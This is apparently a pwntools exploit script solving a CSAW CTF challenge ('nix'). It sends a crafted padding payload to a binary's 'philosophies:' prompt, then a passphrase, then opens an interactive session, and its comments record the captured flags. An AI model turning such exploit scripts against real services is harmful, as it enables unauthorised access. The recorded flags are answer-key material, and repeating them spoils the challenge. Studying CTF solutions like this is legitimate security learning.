#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
context.log_level = "debug"
gs = '''
b *main+462
continue
'''

#version `GLIBCXX_3.4.32' not found
def start():
    if args.REMOTE:
        return remote("nix.ctf.csaw.io", 1000)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])


r = start()

def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)
#csawctf{I_doNT_want_t0_g0_901FING_AnymOrE_pl34S3_Thank_you_!!!}
#========= exploit here ===================

payload = b"\x01"* (0x800 -0x1bc)
sla(b"philosophies:",payload)
sleep(0.2)
sl(b"make every program a filter")

#========= interactive ====================
r.interactive()
#fffff906
#0xfffff83e
#csawctf{-3v3ry7h1ng_15_4_f1l3}